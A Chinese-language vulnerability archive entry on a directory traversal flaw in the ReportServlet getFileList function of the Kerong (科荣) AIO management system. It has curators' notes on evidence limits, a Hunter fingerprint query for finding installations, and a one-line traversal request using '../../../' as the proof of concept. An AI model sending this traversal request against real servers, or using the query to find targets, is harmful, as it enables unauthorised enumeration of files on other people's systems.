---
source: "wy876 漏洞文库"
title: "科荣AIO ReportServlet getFileList目录遍历"
product: "科荣AIO"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "未知版本、相对路径根目录未知"
prerequisites: "未说明"
side_effects: "命令/代码执行示例可能改变主机状态"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/sl2fy096ko7xcihw"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E7%A7%91%E8%8D%A3AIO/%E7%A7%91%E8%8D%A3AIO%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FReportServlet%E5%AD%98%E5%9C%A8%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E.md"
hunter: "app.name=\"科荣 AIO\""
id: "vw-921976cdd06e9b95d922e742"
entity_id: "ve-921976cdd06e9b95d922e742"
schema_version: "1"
previous_fofa_unverified: "app.name="
---

# 科荣AIO ReportServlet getFileList目录遍历

> 指纹字段校订（2026-10-04）：本文原归档明确标为 Hunter 的完整表达式已记入 `hunter`；原残缺 `fofa_unverified` 值逐字保存在 `previous_fofa_unverified`。后文关于该字段残缺的旧说明只描述校订前状态。查询用于产品检索，不证明资产受影响。

## 条目说明

- 对象与具体问题：科荣AIO；ReportServlet getFileList目录遍历
- 版本、配置及部署条件：未知版本、相对路径根目录未知
- 认证与权限前提：未说明
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 只有目录枚举URL无返回，不能等同任意文件读取或RCE
- 影响版本填产品名，特征空；Hunter错入fofa字段

## 操作风险

命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
科荣AIO企业一体化管理解决方案,通过ERP（进销存财务）、OA（办公自动化）、CRM（客户关系管理）、UDP（自定义平台），集电子商务平台、支付平台、ERP平台、微信平台、移动APP等解决了众多企业客户在管理过程中跨部门、多功能、需求多变等通用及个性化的问题。科荣 AIO 管理系统 ReportServlet 存在目录遍历漏洞。

## 二、影响版本
+ 科荣 AIO 管理系统 

## 三、资产测绘
+ hunter`app.name="科荣 AIO"`
+ 特征


## 四、漏洞复现
```plain
/ReportServlet?operation=getFileList&path=../../../
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/sl2fy096ko7xcihw>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
